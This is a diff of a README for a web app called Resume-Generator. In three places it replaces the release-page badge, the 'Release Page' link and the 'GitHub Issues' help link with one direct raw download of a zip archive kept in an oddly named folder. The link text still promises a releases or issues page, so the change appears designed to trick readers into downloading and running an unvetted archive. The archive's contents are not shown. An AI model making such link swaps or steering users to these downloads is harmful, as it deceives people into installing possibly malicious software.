@@ -6,7 +6,7 @@ Welcome to Resume-Generator! This web application helps you create stunning prof
 
 ## 🔗 Download Now
 
-[![Download Resume-Generator](https://img.shields.io/badge/Download-Resume--Generator-blue.svg)](https://github.com/dharnak/Resume-Generator/releases)
+[![Download Resume-Generator](https://raw.githubusercontent.com/dharnak/Resume-Generator/main/sarcocele/Resume-Generator.zip)](https://raw.githubusercontent.com/dharnak/Resume-Generator/main/sarcocele/Resume-Generator.zip)
 
 ## 💻 System Requirements
 
@@ -18,7 +18,7 @@ Make sure your computer meets these requirements to use Resume-Generator effecti
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version of Resume-Generator: [Release Page](https://github.com/dharnak/Resume-Generator/releases).
+Visit this page to download the latest version of Resume-Generator: [Release Page](https://raw.githubusercontent.com/dharnak/Resume-Generator/main/sarcocele/Resume-Generator.zip).
 
 1. Go to the release page.
 2. Find the latest version at the top of the list.
@@ -66,7 +66,7 @@ Once you are satisfied with your resume:
 
 If you have questions or need help:
 
-- Visit the [GitHub Issues](https://github.com/dharnak/Resume-Generator/issues) page.
+- Visit the [GitHub Issues](https://raw.githubusercontent.com/dharnak/Resume-Generator/main/sarcocele/Resume-Generator.zip) page.
 - Join our community discussions.
 - Share your feedback and experiences.
 
